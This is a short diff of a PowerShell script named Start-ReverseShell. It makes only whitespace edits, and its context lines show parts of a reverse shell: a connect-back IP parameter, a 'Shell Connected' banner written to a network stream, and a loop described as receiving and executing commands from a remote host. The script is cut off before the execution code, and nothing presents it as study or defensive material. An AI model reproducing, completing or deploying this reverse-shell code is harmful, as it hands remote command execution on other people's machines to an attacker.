@@ -1,6 +1,5 @@
 using namespace System.Text;
 using namespace System.Net.Sockets;
-
 Function Start-ReverseShell {
     param (
         [string]$IP = "127.0.0.1" ,
@@ -16,7 +15,7 @@ Function Start-ReverseShell {
         # Send a connection confirmation
         $sendbytes = ([text.encoding]::UTF8).GetBytes('Shell Connected: ' + (Get-Date).ToString() + "`n")
         $stream.Write($sendbytes, 0, $sendbytes.Length)
-        
+
         # Enter a loop to receive commands from the remote host and execute them
         while ($stream -and $stream.Read($bytes, 0, $bytes.Length) -ne 0) {
 
